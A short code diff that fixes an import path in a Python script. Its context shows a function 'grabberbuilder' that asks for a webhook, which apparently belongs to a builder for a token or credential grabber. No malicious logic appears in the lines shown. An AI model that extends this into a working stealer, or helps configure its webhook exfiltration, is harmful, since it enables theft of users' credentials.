@@ -2,7 +2,7 @@ import os
 import subprocess
 import requests
 import sys
-from util.plugin.common import *
+from util.plugins.common import *
 
 def grabberbuilder():
     webhook = input(f'Webhook: ')
